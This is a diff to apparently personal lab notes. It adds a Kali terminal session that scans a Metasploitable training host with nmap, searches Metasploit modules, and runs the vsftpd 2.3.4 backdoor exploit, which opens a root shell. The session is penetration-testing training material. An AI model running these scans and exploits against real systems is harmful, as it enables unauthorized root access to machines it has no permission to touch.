@@ -8,6 +8,141 @@ OR options: Just displays the options available for the module
 exploit OR run: Runs the module
 
 ```
+
+┌──(root💀kali)-[~]
+└─# nmap -sV 172.22.117.150
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-04-02 20:42 EDT
+Nmap scan report for 172.22.117.150
+Host is up (0.023s latency).
+Not shown: 976 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  shell       Netkit rshd
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+2222/tcp open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:15:5D:00:04:06 (Microsoft)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.65 secondsms
+
+
+
+msf6 > search vsftp
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > search smtp-enum
+[-] No results from search
+msf6 > search smtp_enum
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank    Check  Description
+   -  ----                              ---------------  ----    -----  -----------
+   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum
+
+msf6 > search ssh_login
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
+   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
+
+msf6 >
+
+
+----------------------------------------------
+
+`setup and exploit/run`
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  172.22.117.150   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
+                                      tasploit
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 172.22.117.150:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 172.22.117.150:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 172.22.117.150:21 - The port used by the backdoor bind listener is already open
+[+] 172.22.117.150:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (172.22.117.100:35089 -> 172.22.117.150:6200 ) at 2025-04-02 20:50:32 -0400
+
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+
 search distcc
 
 use 0
@@ -131,12 +266,4 @@ http://help.ubuntu.com/
 
 -------------------------------------------------------------------------------------
 
-
-
--------------------------------------------------------------------------------------
-
-
--------------------------------------------------------------------------------------
-
--------------------------------------------------------------------------------------
 ```
